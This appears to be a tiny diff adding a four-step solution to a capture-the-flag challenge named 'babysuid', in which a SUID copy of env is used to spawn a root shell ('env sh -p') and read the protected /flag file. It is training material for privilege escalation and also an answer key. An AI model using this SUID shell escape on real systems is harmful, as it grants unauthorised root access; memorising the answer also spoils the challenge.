@@ -1,0 +1,4 @@
+1 Connect to terminal
+2 Read instructions : /challenge/babysuid
+3 Execute shell in root : /challenge/bin/env sh -p
+4 Read the flag : cat /flag
